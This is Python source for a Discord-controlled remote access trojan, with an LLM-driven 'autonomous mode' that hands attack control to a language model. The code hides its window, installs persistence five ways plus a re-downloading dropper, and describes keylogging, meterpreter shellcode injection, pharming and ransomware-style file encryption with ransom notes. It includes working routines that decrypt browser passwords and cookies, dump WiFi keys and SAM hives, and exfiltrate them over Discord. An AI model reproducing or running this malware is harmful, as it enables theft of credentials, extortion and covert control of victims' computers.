# --- Discord and OpenAI API Keys ---
BOT_TOKEN = ""
OPENAI_API_KEY = ""
# --- Operator RSA Public Key (RSA-4096, PEM) ---
# Generate with: openssl genrsa -out op_private.pem 4096 && openssl rsa -in op_private.pem -pubout -out op_public.pem
# Paste the full contents of op_public.pem as the value below (including BEGIN/END lines).
# The AES master key from !encrypt will be wrapped with this key (RSA-4096 OAEP + SHA-256).
# Only the holder of op_private.pem can recover the AES key. Leave empty to fall back to plain hex (insecure).
OPERATOR_RSA_PUBLIC_KEY = """"""
# --- Recovery URL (dropper stage) ---
# If all 3 EXE copies are deleted AND the system reboots, the dropper will
# download the agent EXE from this URL and re-deploy it automatically.
# Host your built EXE somewhere accessible (e.g. a private web server, CDN, or
# GitHub release). Leave empty to disable the download-recovery feature.
RECOVERY_URL = ""
# --- Required Imports ---

import os
import re
import shlex
import subprocess
import getpass
from urllib.parse import unquote, urlsplit
import discord
import asyncio
import random
import platform
import uuid
import time
import datetime
import json
import ctypes

# Hide console window immediately (before any errors can display)
if os.name == "nt":
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE


INSTANCE_MUTEX_HANDLE = None

def get_cached_id_path():
    base_dir = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA") or os.path.expanduser("~")
    return os.path.join(base_dir, "ART", "machine-id.txt")


def load_cached_id():
    try:
        with open(get_cached_id_path(), "r", encoding="utf-8") as file_handle:
            cached_id = file_handle.read().strip()
            if cached_id:
                return cached_id
    except OSError:
        pass
    return None


def store_cached_id(machine_id):
    try:
        cache_path = get_cached_id_path()
        os.makedirs(os.path.dirname(cache_path), exist_ok=True)
        with open(cache_path, "w", encoding="utf-8") as file_handle:
            file_handle.write(machine_id)
    except OSError:
        pass


def get_windows_machine_guid():
    if os.name != "nt":
        return None
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key_handle:
            machine_guid, _ = winreg.QueryValueEx(key_handle, "MachineGuid")
            machine_guid = str(machine_guid).strip().lower()
            if machine_guid:
                return machine_guid
    except OSError:
        pass
    return None


def get_unique_id():
    machine_guid = get_windows_machine_guid()
    if machine_guid:
        return machine_guid
    try:
        mac = uuid.getnode()
        if not ((mac >> 40) % 2):
            return hex(mac)[2:]
    except Exception:
        pass

    cached_id = load_cached_id()
    if cached_id:
        return cached_id

    generated_id = str(uuid.uuid4())
    store_cached_id(generated_id)
    return generated_id


def acquire_single_instance_guard():
    global INSTANCE_MUTEX_HANDLE
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        mutex_name = f"Local\\ART-{get_unique_id()}"
        handle = kernel32.CreateMutexW(None, False, mutex_name)
        if not handle:
            return True
        INSTANCE_MUTEX_HANDLE = handle
        if kernel32.GetLastError() == 183:
            return False
        return True
    except Exception:
        return True

def get_hostname():
    try:
        return platform.node()
    except Exception:
        return os.environ.get("COMPUTERNAME", "unknown-host")


def get_current_user():
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown-user"


def configure_windows_event_loop_policy():
    if os.name != "nt":
        return
    selector_policy = getattr(asyncio, "WindowsSelectorEventLoopPolicy", None)
    if selector_policy is not None:
        asyncio.set_event_loop_policy(selector_policy())



class DiscordC2(discord.Client):
    async def _run_shell_command(self, command):
        def _run():
            completed = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                cwd=self.current_dir,
            )
            return (completed.stdout + completed.stderr).decode("utf-8", errors="replace")

        return await asyncio.to_thread(_run)

    async def _write_text_file(self, path, content):
        def _write():
            with open(path, "w", encoding="utf-8") as file_handle:
                file_handle.write(content)

        await asyncio.to_thread(_write)

    async def _remove_file_if_exists(self, path):
        def _remove():
            if os.path.exists(path):
                os.remove(path)

        await asyncio.to_thread(_remove)

    async def on_message(self, message):
        # Ignore messages from self
        if message.author == self.user:
            return
        # Only process commands in the agent's command channel
        if hasattr(self, 'channel') and message.channel.id != self.channel.id:
            return
        content = message.content.strip()
        cmd = content.lower()
        self.last_heartbeat = time.time()

        def strip_outer_quotes(value):
            if len(value) >= 2 and value[0] == value[-1] and value[0] in ('"', "'"):
                return value[1:-1]
            return value

        # Recognize !report and !abort regardless of case/whitespace
        if cmd == "!report":
            await self.generate_and_upload_report(message.channel)
            return
        if cmd == "!abort":
            await message.channel.send("[mode] Aborting autonomous mode and switching to passive. Generating report...")
            self.mode = "passive"
            await self.generate_and_upload_report(message.channel)
            return
        # Mode switching
        if cmd.startswith("!mode"):
            arg = cmd[5:].strip().lower()
            if arg == "passive":
                if self.mode == "passive":
                    await message.channel.send("🟢 Agent is already in **Passive Mode**.")
                else:
                    self.mode = "passive"
                    await message.channel.send("🟢 Agent switched to **Passive Mode**. Awaiting human commands.")
                    await self.global_logs_channel.send(f"[mode] {self.hostname}: Switched to Passive Mode.")
                    await self.generate_and_upload_report(message.channel)
                return
            elif arg == "active":
                if self.mode == "active":
                    await message.channel.send("🟢 Agent is already in **Autonomous (Active) Mode**.")
                else:
                    self.mode = "active"
                    await message.channel.send("🟢 Agent switched to **Autonomous (Active) Mode**. LLM now in control.")
                    await self.global_logs_channel.send(f"[mode] {self.hostname}: Switched to Autonomous (Active) Mode.")
                    asyncio.create_task(self.start_autonomous_loop())
                return
        # --- Persistence Command ---
        if cmd.startswith("!persist"):
            import sys, shutil
            args = content[8:].strip().lower()
            results = []
            # Three independent copy locations — each one is a separate survival path
            copy_targets = self._copy_targets()
            appdata    = os.environ.get("APPDATA", os.path.expanduser("~"))
            # VBS launcher path — all triggers point here; launcher tries each copy in order
            vbs_path    = self._vbs_launcher_path()
            trigger_cmd = f'wscript.exe /B "{vbs_path}"'
            if "setup" in args or not args:
                src = os.path.abspath(sys.argv[0])
                for dest in copy_targets:
                    try:
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.normcase(src) != os.path.normcase(dest):
                            shutil.copy2(src, dest)
                        results.append(f"Copy → {dest}")
                    except Exception as e:
                        results.append(f"Copy failed ({dest}): {e}")
                # Write the silent VBS launcher
                if self._write_vbs_launcher(vbs_path, copy_targets):
                    results.append(f"VBS launcher → {vbs_path}")
                else:
                    results.append(f"VBS launcher failed: {vbs_path}")
                # All 5 triggers point to the VBS launcher — deleting one EXE copy
                # does NOT break persistence; VBS falls through to the next live copy
                ok, msg = self.setup_registry_run_key(trigger_cmd)
                results.append(msg)
                ok2, msg2 = self.setup_startup_shortcut(vbs_path)
                results.append(msg2)
                ok3, msg3 = self.setup_schtask(trigger_cmd)
                results.append(msg3)
                ok4, msg4 = self.setup_registry_load_key(trigger_cmd)
                results.append(msg4)
                ok5, msg5 = self.setup_userinit_logon_script(trigger_cmd)
                results.append(msg5)
                # Deploy dropper (recovery stage) — survives full deletion of all EXE copies
                if RECOVERY_URL:
                    drp_files = self._write_dropper(RECOVERY_URL)
                    results.extend(drp_files)
                    drp_persist = self._deploy_dropper_persistence()
                    results.extend(drp_persist)
                else:
                    results.append("Dropper skipped — RECOVERY_URL not set.")
                await message.channel.send("\n".join(results))
                await self.global_logs_channel.send(f"[persist] {self.hostname}: {'; '.join(results)}")
                return
            if "cleanup" in args:
                ok, msg = self.cleanup_registry_run_key()
                results.append(msg)
                ok2, msg2 = self.cleanup_startup_shortcut()
                results.append(msg2)
                ok3, msg3 = self.cleanup_schtask()
                results.append(msg3)
                ok4, msg4 = self.cleanup_registry_load_key()
                results.append(msg4)
                ok5, msg5 = self.cleanup_userinit_logon_script()
                results.append(msg5)
                # Remove VBS launcher
                try:
                    vbs_path = self._vbs_launcher_path()
                    if os.path.exists(vbs_path):
                        os.remove(vbs_path)
                        results.append(f"Removed VBS launcher: {vbs_path}")
                except Exception as e:
                    results.append(f"VBS removal failed: {e}")
                # Remove dropper (recovery stage)
                drp_results = self._cleanup_dropper()
                results.extend(drp_results)
                # Remove all copies
                for dest in copy_targets:
                    try:
                        if os.path.exists(dest):
                            os.remove(dest)
                            results.append(f"Removed copy: {dest}")
                    except Exception as e:
                        results.append(f"Copy removal failed ({dest}): {e}")
                await message.channel.send("\n".join(results))
                await self.global_logs_channel.send(f"[persist-cleanup] {self.hostname}: {'; '.join(results)}")
                return
        # !help command
        if cmd.startswith("!help"):
            args = content.split()
            subcmd = args[1].lower() if len(args) > 1 else None
            if not subcmd:
                help_text_1 = (
                    "**General Commands:**\n"
                    "    • `!help` — Show this help menu\n"
                    "    • `!help <command>` — Show help for a specific command\n\n"
                    "    • `!mode active` — Start autonomous mode and hand control to the LLM\n"
                    "    • `!mode passive` — Return to passive mode and generate a report when leaving active mode\n"
                    "    • `!report` — Generate the current assessment report and upload it to #reports\n"
                    "    • `!abort` — Stop autonomous mode, switch to passive mode, and generate a report\n"
                    "    • `!sysinfo` — OS, domain, AV, local admins, logged-on users, privileges\n"
                    "    • `!ps` — List running processes\n"
                    "    • `!whoami` — Current user, groups and privileges\n"
                    "    • `!screenshot` — Capture and send a screenshot of the desktop\n"
                    "    • `!clipboard read` — Read clipboard contents\n"
                    "    • `!clipboard write <text>` — Write to clipboard\n"
                    "    • `!keylog start|stop|dump|status` — In-memory keylogger\n"
                    "    • `!kill <pid>` — Terminate a process by PID\n"
                    "    • `!message <text>` — Show a message box on victim\n"
                    "    • `!ls [path]` — List directory contents\n"
                    "    • `!cd [path]` — Change current directory\n"
                    "    • `!download [path]` — Download a file from the victim\n"
                    "    • `!upload <url|filename> [dest]` — Download from URL or retrieve from #payloads\n"
                    "    • `!upload --zip <archive.zip> [dest]` — Retrieve a zip payload and extract it after download\n"
                    "    • `!upload --b64 <payload.b64> [dest]` — Retrieve a base64 payload and decode it after download\n"
                    "    • `!zip <file|folder>` — Zip a file or folder and send it as an attachment\n"
                    "    • `!delete <path>` — Delete a file on the victim\n"
                    "    • `!dump [type]` — Collect browser passwords, cookies, hashes, WiFi, and environment loot (types: password, cookie, hash, wifi, env, all)\n"
                    "    • `!pharm <add|remove|list|show|flush>` — DNS poisoning via hosts file\n"
                    "    • `!shell <command>` — Run a system shell command and return output\n"
                    "    • Any other text — Executed as a shell command in the agent's current directory"
                )
                help_text_2 = (
                    "**Persistence & OPSEC:**\n"
                    "    • `!persist [setup|cleanup]` — Setup or remove persistence\n"
                    "        - Registry Run Key, Startup Shortcut, Scheduled Task, Load key, LogonScript\n"
                    "        - `!persist setup` — Apply all methods (default)\n"
                    "        - `!persist cleanup` — Remove all persistence for OPSEC\n"
                    "    • `!runas <user> <password> <cmd>` — Run a command as another user\n"
                    "    • `!inject <pid> <base64_sc>` — Inject raw shellcode into a process (in-memory)\n"
                    "    • `!stager <url|filename> [dest]` — Drop + exec an MSF stager EXE (drop-and-run)\n"
                    "    • `!timestomp <source> <target>` — Clone timestamps from source onto target file\n"
                    "    • `!stealth` — Hide the agent console window\n"
                    "    • `!exfil <file>` — Send a specific file back as a Discord attachment\n"
                    "    • `!files [path]` — List all encrypted .art files under a path with sizes\n"
                    "    • `!note <path> <text>` — Drop a README.txt note into a folder\n"
                    "    • `!encrypt <path>` — AES-256-GCM encrypt every file under a path; key sent to operator\n"
                    "    • `!decrypt <path> <key_hex>` — Decrypt all .art files under a path using the AES-256 key\n"
                    "    • `!wipe` — Secure-delete loot files and the agent EXE, then exit\n"
                    "    • `!selfdestruct` — Full cleanup: remove all persistence, all EXE copies, wipe loot, self-delete, then exit\n\n"
                    "**Autonomous Workflow:**\n"
                    "    - `!report` works on demand while an assessment is running\n"
                    "    - `!abort` stops autonomous execution and pushes the report immediately\n"
                    "    - Reports are uploaded to #reports\n\n"
                    "**Notes:**\n"
                    "    - All actions and command results are logged to #global-logs\n"
                    "    - Commands are only processed in this agent's assigned command channel\n"
                    "    - Use `!help` at any time to display this menu"
                )
                await message.channel.send(help_text_1)
                await message.channel.send(help_text_2)
                return
            # Detailed help for specific commands
            command_help = {
                "help": "`!help [command]` — Show this help menu or details for a specific command.",
                "report": "`!report` — Generate the current assessment report and upload it to #reports.",
                "abort": "`!abort` — Stop autonomous mode, switch to passive mode, and generate a report.",
                "mode": "`!mode active|passive` — Switch between autonomous (active) and passive modes.",
                "message": "`!message <text>` — Show a message box on the victim's screen.",
                "ls": "`!ls [path]` — List directory contents. Defaults to current directory if no path is given.",
                "cd": "`!cd [path]` — Change the current working directory.",
                "download": "`!download [path]` — Download a file from the victim machine.",
                "upload": (
                    "`!upload [--zip|--b64] <url|filename> [dest]` — Transfer a payload to the victim.\n"
                    "Modes:\n"
                    "  default — Download from a URL or retrieve an exact file from #payloads\n"
                    "  --zip — Retrieve a `.zip` payload, then extract it after download\n"
                    "  --b64 — Retrieve a `.b64` or `.base64` payload, then decode it after download"
                ),
                "delete": "`!delete <path>` — Delete a file on the victim machine.",
                "dump": (
                    "`!dump [type]` — Collect loot.\n"
                    "Types:\n"
                    "  password — Only dump browser-saved passwords\n"
                    "  cookie   — Only dump browser cookies\n"
                    "  hash     — Dump Windows SAM/SYSTEM/SECURITY hives (requires admin; crack offline with secretsdump)\n"
                    "  wifi     — Dump saved WiFi SSIDs and passwords\n"
                    "  env      — Only dump environment variables\n"
                    "  all      — Dump everything (default if no type given)"
                ),
                "pharm": (
                    "`!pharm <add|remove|list|show|flush> [domain] [ip]` — Modify the hosts file for DNS poisoning.\n"
                    "Subcommands:\n"
                    "  add <domain> <ip> — Redirect a domain to an IP (appends to hosts file)\n"
                    "  remove <domain>   — Remove the pharm entry for a domain\n"
                    "  list              — Show all active pharm redirects\n"
                    "  show              — Display the full hosts file\n"
                    "  flush             — Remove all pharm redirects at once"
                ),
                "shell": "`!shell <command>` — Run a system shell command and return the output.",
                "persist": (
                    "`!persist [setup|cleanup]` — Setup or remove persistence.\n"
                    "  setup — Apply all methods (default)\n"
                    "  cleanup — Remove all persistence for OPSEC"
                ),
                "sysinfo": "`!sysinfo` — OS version, domain, installed AV, local admins, logged-on users and privileges in one report.",
                "ps": "`!ps` — List all running processes (name, PID, session, memory).",
                "whoami": "`!whoami` — Current user, group memberships and privileges (whoami /all).",
                "screenshot": "`!screenshot` — Capture and send a screenshot of the current desktop.",
                "clipboard": "`!clipboard read` — Read clipboard.\n`!clipboard write <text>` — Write to clipboard.",
                "keylog": (
                    "`!keylog <start|stop|dump|status>` — In-memory keylogger.\n"
                    "  start  — Start capturing keystrokes\n"
                    "  stop   — Stop capturing\n"
                    "  dump   — Send buffered keystrokes as a file and clear buffer\n"
                    "  status — Show running state and buffer size"
                ),
                "kill": "`!kill <pid>` — Forcefully terminate a process by PID.",
                "zip": "`!zip <file|folder>` — Zip a file or entire folder and send it as a Discord attachment.",
                "runas": "`!runas <user> <password> <command>` — Run a command as another Windows user.",
                "inject": (
                    "`!inject <pid> <base64_sc>` — Inject raw shellcode into a running process (in-memory, no file on disk).\n"
                    "Generate: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f raw | base64 -w0`\n"
                    "Meterpreter calls back directly to your MSF listener."
                ),
                "stager": (
                    "`!stager <url|filename> [dest_path]` — Download and silently execute an MSF stager EXE (drop-and-run).\n"
                    "Generate: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f exe -o stage.exe`\n"
                    "Pass a URL (http/https) OR upload stage.exe to #payloads and pass just the filename.\n"
                    "File is dropped to disk then launched hidden."
                ),
                "timestomp": "`!timestomp <source_file> <target_file>` — Clone MAC timestamps and creation time from source onto target.",
                "exfil": "`!exfil <file_path>` — Send a specific file from the victim back as a Discord attachment. Files over 25 MB will fail — use `!zip` first.",
                "files": "`!files [path]` — List all `.art` encrypted files under the given path (or current dir) with individual sizes and a total.",
                "note": "`!note <directory_path> <message text>` — Write a README.txt note file into the given directory. Useful for leaving instructions inside encrypted folders.",
                "encrypt": (
                    "`!encrypt <path>` — Recursively encrypt every file under <path> with AES-256-GCM.\n"
                    "Each file gets a unique derived key (HKDF-SHA256 from a random per-file salt).\n"
                    "Files are renamed to random UUIDs; originals are securely overwritten before deletion.\n"
                    "Format per .art file: [salt(32)][nonce(16)][AES-256-GCM ciphertext][tag(16)].\n"
                    "The master key (hex) is sent to the operator channel immediately after completion."
                ),
                "decrypt": (
                    "`!decrypt <path> <key_hex>` — Recursively decrypt all .art files under <path>.\n"
                    "Restores each file to its original name and removes the .art file.\n"
                    "<key_hex> is the 64-character hex key returned by `!encrypt`."
                ),
                "wipe": "`!wipe` — Overwrite and delete all loot files, schedule self-deletion of the agent EXE, then disconnect.",
                "selfdestruct": "`!selfdestruct` — Full OPSEC cleanup: removes all persistence triggers, deletes all EXE copies, wipes loot files, schedules self-deletion of the agent EXE, then disconnects.",
                "stealth": "`!stealth` — Hide the agent console window (SW_HIDE).",
            }
            key = subcmd.strip("!")
            msg = command_help.get(key)
            if msg:
                await message.channel.send(f"**Help for `{subcmd}`:**\n{msg}")
            else:
                await message.channel.send(f"No detailed help available for `{subcmd}`.")
            return
        # !dump command
        if cmd.startswith("!dump"):
            args = content.split()
            subcmd = args[1].lower() if len(args) > 1 else "all"
            await message.channel.send(f"[dump] Collecting: {subcmd}")
            loot_files = []
            errors = []
            wants_passwords = subcmd in ("all", "password", "passwords")
            wants_cookies = subcmd in ("all", "cookie", "cookies")
            wants_hashes = subcmd in ("all", "hash", "hashes")
            wants_wifi = subcmd in ("all", "wifi")

            # Browser passwords and cookies
            if wants_passwords or wants_cookies:
                try:
                    import shutil, glob, base64, sqlite3, tempfile
                    import json as js
                    import win32crypt
                    from Crypto.Cipher import AES
                    user_dir = os.environ.get("USERPROFILE") or os.path.expanduser("~")
                    chromium_browsers = [
                        ("Chrome",   os.path.join(user_dir, r"AppData\Local\Google\Chrome\User Data")),
                        ("Edge",     os.path.join(user_dir, r"AppData\Local\Microsoft\Edge\User Data")),
                        ("Brave",    os.path.join(user_dir, r"AppData\Local\BraveSoftware\Brave-Browser\User Data")),
                        ("Opera",    os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera Stable")),
                        ("OperaGX",  os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera GX Stable")),
                        ("Vivaldi",  os.path.join(user_dir, r"AppData\Local\Vivaldi\User Data")),
                    ]

                    def _decrypt_chromium(master_key, encrypted):
                        """Decrypt a Chromium-encrypted value (AES-256-GCM or DPAPI fallback)."""
                        if not encrypted:
                            return ""
                        if encrypted[:3] == b'v10':
                            iv = encrypted[3:15]
                            ciphertext = encrypted[15:-16]
                            tag = encrypted[-16:]
                            try:
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                            except Exception:
                                return "[decryption failed]"
                        else:
                            try:
                                return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode("utf-8", errors="replace")
                            except Exception:
                                return "[decryption failed]"

                    def _filetime_to_unix(ft):
                        """Convert Chromium/Windows FILETIME (microseconds since 1601-01-01) to Unix seconds."""
                        return max(0, int(ft) // 1_000_000 - 11644473600) if ft else 0

                    def _write_netscape(cookie_list, path):
                        """Write cookies in Netscape format (curl / wget / Burp Suite compatible)."""
                        lines = ["# Netscape HTTP Cookie File"]
                        for c in cookie_list:
                            domain = c["host"]
                            include_sub = "TRUE" if domain.startswith(".") else "FALSE"
                            http_only_prefix = "#HttpOnly_" if c["is_httponly"] else ""
                            secure = "TRUE" if c["is_secure"] else "FALSE"
                            expiry = c["expires_unix"]
                            lines.append(f"{http_only_prefix}{domain}\t{include_sub}\t{c['path']}\t{secure}\t{expiry}\t{c['name']}\t{c['value']}")
                        with open(path, "w", encoding="utf-8") as f:
                            f.write("\n".join(lines))

                    def _write_cookie_editor(cookie_list, path):
                        """Write cookies in Cookie-Editor JSON format (import via Cookie-Editor browser extension)."""
                        out = []
                        for c in cookie_list:
                            expiry = c["expires_unix"]
                            is_session = expiry <= 0
                            entry = {
                                "domain": c["host"],
                                "hostOnly": not c["host"].startswith("."),
                                "httpOnly": c["is_httponly"],
                                "name": c["name"],
                                "path": c["path"],
                                "sameSite": "unspecified",
                                "secure": c["is_secure"],
                                "session": is_session,
                                "storeId": "0",
                                "value": c["value"],
                            }
                            if not is_session:
                                entry["expirationDate"] = expiry
                            out.append(entry)
                        with open(path, "w", encoding="utf-8") as f:
                            js.dump(out, f, indent=2)

                    for browser, base_path in chromium_browsers:
                        if not os.path.exists(base_path):
                            continue
                        local_state_path = os.path.join(base_path, "Local State")
                        # Derive master key once per browser, not once per profile
                        master_key = None
                        if os.path.exists(local_state_path):
                            try:
                                with open(local_state_path, "r", encoding="utf-8") as f:
                                    local_state = js.load(f)
                                raw_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                                master_key = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
                            except Exception as e:
                                errors.append(f"{browser} key: {e}")
                        if master_key is None:
                            continue
                        profiles = ["Default"]
                        try:
                            profiles += [d for d in os.listdir(base_path) if d.startswith("Profile ")]
                        except Exception:
                            pass
                        # Accumulate all profiles into single lists → one file per browser
                        all_passwords = []
                        all_cookies = []
                        for profile in profiles:
                            # --- Passwords ---
                            if wants_passwords:
                                login_db = os.path.join(base_path, profile, "Login Data")
                                if os.path.exists(login_db):
                                    _fd, tmp = tempfile.mkstemp(suffix="_login.db")
                                    os.close(_fd)
                                    try:
                                        shutil.copy2(login_db, tmp)
                                        conn = sqlite3.connect(tmp)
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                        for url, username, encrypted in cursor.fetchall():
                                            pw = _decrypt_chromium(master_key, encrypted)
                                            if username or (pw and pw != "[decryption failed]"):
                                                all_passwords.append({"profile": profile, "url": url, "user": username, "pass": pw})
                                        conn.close()
                                    except Exception as e:
                                        errors.append(f"{browser}/{profile} passwords: {e}")
                                    finally:
                                        try: os.remove(tmp)
                                        except Exception: pass
                            # --- Cookies ---
                            if wants_cookies:
                                cookie_candidates = [
                                    os.path.join(base_path, profile, "Network", "Cookies"),
                                    os.path.join(base_path, profile, "Cookies"),
                                ]
                                if profile == "Default":
                                    cookie_candidates += [
                                        os.path.join(base_path, "Network", "Cookies"),
                                        os.path.join(base_path, "Cookies"),
                                    ]
                                cookies_db = next((p for p in cookie_candidates if os.path.exists(p)), None)
                                if cookies_db:
                                    _fd, tmp = tempfile.mkstemp(suffix="_cookies.db")
                                    os.close(_fd)
                                    try:
                                        shutil.copy2(cookies_db, tmp)
                                        conn = sqlite3.connect(tmp)
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, last_access_utc FROM cookies")
                                        for host, name, path, encrypted, expires, secure, httponly, last_access in cursor.fetchall():
                                            value = _decrypt_chromium(master_key, encrypted)
                                            if value and value != "[decryption failed]":
                                                all_cookies.append({
                                                    "host": host, "name": name, "path": path, "value": value,
                                                    "expires_unix": _filetime_to_unix(expires),
                                                    "is_secure": bool(secure), "is_httponly": bool(httponly),
                                                })
                                        conn.close()
                                    except Exception as e:
                                        errors.append(f"{browser}/{profile} cookies: {e}")
                                    finally:
                                        try: os.remove(tmp)
                                        except Exception: pass
                        # One file per browser (skip if empty)
                        if wants_passwords and all_passwords:
                            p = os.path.join(self.current_dir, f"{browser}_passwords.json")
                            with open(p, "w", encoding="utf-8") as f:
                                js.dump(all_passwords, f, indent=2)
                            loot_files.append(p)
                        if wants_cookies and all_cookies:
                            p_ns = os.path.join(self.current_dir, f"{browser}_cookies.txt")
                            p_ce = os.path.join(self.current_dir, f"{browser}_cookies_cookieeditor.json")
                            _write_netscape(all_cookies, p_ns)
                            _write_cookie_editor(all_cookies, p_ce)
                            loot_files.append(p_ns)
                            loot_files.append(p_ce)

                    # Firefox: logins.json (plaintext, decryption requires NSS) + cookies.sqlite
                    ff_profiles = glob.glob(os.path.join(user_dir, r"AppData\Roaming\Mozilla\Firefox\Profiles\*"))
                    for prof in ff_profiles:
                        prof_name = os.path.basename(prof)
                        if wants_passwords:
                            logins = os.path.join(prof, "logins.json")
                            if os.path.exists(logins):
                                loot_path = os.path.join(self.current_dir, f"Firefox_{prof_name}_logins.json")
                                shutil.copy2(logins, loot_path)
                                loot_files.append(loot_path)
                        if wants_cookies:
                            cookies_sqlite = os.path.join(prof, "cookies.sqlite")
                            if os.path.exists(cookies_sqlite):
                                _fd, tmp = tempfile.mkstemp(suffix="_ff_cookies.db")
                                os.close(_fd)
                                try:
                                    shutil.copy2(cookies_sqlite, tmp)
                                    conn = sqlite3.connect(tmp)
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, lastAccessed FROM moz_cookies")
                                    # Firefox expiry is already Unix seconds
                                    cookies = [
                                        {"host": host, "name": name, "path": path, "value": value,
                                         "expires_unix": int(expiry) if expiry else 0,
                                         "is_secure": bool(secure), "is_httponly": bool(httponly)}
                                        for host, name, value, path, expiry, secure, httponly, last_access
                                        in cursor.fetchall() if value
                                    ]
                                    conn.close()
                                    if cookies:
                                        p_ns = os.path.join(self.current_dir, f"Firefox_{prof_name}_cookies.txt")
                                        p_ce = os.path.join(self.current_dir, f"Firefox_{prof_name}_cookies_cookieeditor.json")
                                        _write_netscape(cookies, p_ns)
                                        _write_cookie_editor(cookies, p_ce)
                                        loot_files.append(p_ns)
                                        loot_files.append(p_ce)
                                except Exception as e:
                                    errors.append(f"Firefox/{prof_name} cookies: {e}")
                                finally:
                                    try: os.remove(tmp)
                                    except Exception: pass
                except Exception as e:
                    errors.append(f"Browser loot error: {e}")
            # Environment variables
            if subcmd in ("all", "env", "envs", "envvar", "envvars"):
                try:
                    env_out = os.path.join(self.current_dir, "env_vars.json")
                    with open(env_out, "w", encoding="utf-8") as f:
                        import json as js
                        js.dump(dict(os.environ), f, indent=2)
                    loot_files.append(env_out)
                except Exception as e:
                    errors.append(f"Env var dump error: {e}")
            # WiFi passwords
            if wants_wifi:
                try:
                    import subprocess, json as js
                    profiles_out = subprocess.run(
                        ["netsh", "wlan", "show", "profiles"],
                        capture_output=True, text=True
                    ).stdout
                    profile_names = [
                        line.split(":")[1].strip()
                        for line in profiles_out.splitlines()
                        if "All User Profile" in line
                    ]
                    wifi_data = []
                    for name in profile_names:
                        detail = subprocess.run(
                            ["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
                            capture_output=True, text=True
                        ).stdout
                        password = ""
                        for line in detail.splitlines():
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                break
                        auth = ""
                        for line in detail.splitlines():
                            if "Authentication" in line:
                                auth = line.split(":")[1].strip()
                                break
                        wifi_data.append({"ssid": name, "auth": auth, "password": password})
                    if wifi_data:
                        wifi_out = os.path.join(self.current_dir, "wifi_passwords.json")
                        with open(wifi_out, "w", encoding="utf-8") as f:
                            js.dump(wifi_data, f, indent=2)
                        loot_files.append(wifi_out)
                except Exception as e:
                    errors.append(f"WiFi dump error: {e}")
            # Windows SAM/SYSTEM/SECURITY hive dump (requires admin)
            if wants_hashes:
                try:
                    import subprocess, tempfile
                    _fd1, sam_path = tempfile.mkstemp(suffix="_sam.hiv"); os.close(_fd1)
                    _fd2, sys_path = tempfile.mkstemp(suffix="_system.hiv"); os.close(_fd2)
                    _fd3, sec_path = tempfile.mkstemp(suffix="_security.hiv"); os.close(_fd3)
                    r1 = subprocess.run(["reg", "save", "HKLM\\SAM",      sam_path,  "/y"], capture_output=True)
                    r2 = subprocess.run(["reg", "save", "HKLM\\SYSTEM",   sys_path,  "/y"], capture_output=True)
                    r3 = subprocess.run(["reg", "save", "HKLM\\SECURITY", sec_path,  "/y"], capture_output=True)
                    if r1.returncode == 0 and r2.returncode == 0:
                        import zipfile
                        _fd_z, hive_zip = tempfile.mkstemp(suffix="_hives.zip"); os.close(_fd_z)
                        with zipfile.ZipFile(hive_zip, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
                            zf.write(sam_path,  "sam.hiv")
                            zf.write(sys_path,  "system.hiv")
                            if r3.returncode == 0:
                                zf.write(sec_path, "security.hiv")
                        loot_files.append(hive_zip)
                        errors.append("[hash] Hives zipped. Extract and run: impacket-secretsdump LOCAL -sam sam.hiv -system system.hiv -security security.hiv")
                    else:
                        errors.append(f"[hash] reg save failed (admin required): SAM={r1.returncode} SYS={r2.returncode}")
                    for _p in (sam_path, sys_path, sec_path):
                        try:
                            os.remove(_p)
                        except Exception:
                            pass
                except Exception as e:
                    errors.append(f"Hash dump error: {e}")
            # Send loot files
            if loot_files:
                sent_any = False
                for fpath in loot_files:
                    try:
                        await message.channel.send(file=discord.File(fpath))
                        await self.global_logs_channel.send(f"[dump] {self.hostname}: Sent loot file {fpath}")
                        sent_any = True
                    except Exception as e:
                        errors.append(f"Send file error ({fpath}): {e}")
                    finally:
                        # Remove all loot files after upload attempt (OPSEC: nothing left behind)
                        try:
                            if os.path.exists(fpath):
                                os.remove(fpath)
                        except Exception:
                            pass
                if not sent_any:
                    await message.channel.send("[dump] No loot files could be sent (none found or all failed).")
                elif errors:
                    await message.channel.send("[dump] Some errors occurred:\n" + "\n".join(errors))
                    await self.global_logs_channel.send(f"[dump] {self.hostname}: Errors: {'; '.join(errors)}")
                else:
                    await message.channel.send("[dump] Complete. All loot sent.")
            else:
                await message.channel.send("[dump] No loot files found for this command.")
            return
        # !shell command
        if cmd.startswith("!shell "):
            shell_cmd = content[7:].strip()
            if not shell_cmd:
                await message.channel.send("❌ Usage: !shell <command>")
                return
            try:
                import subprocess
                result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, cwd=self.current_dir)
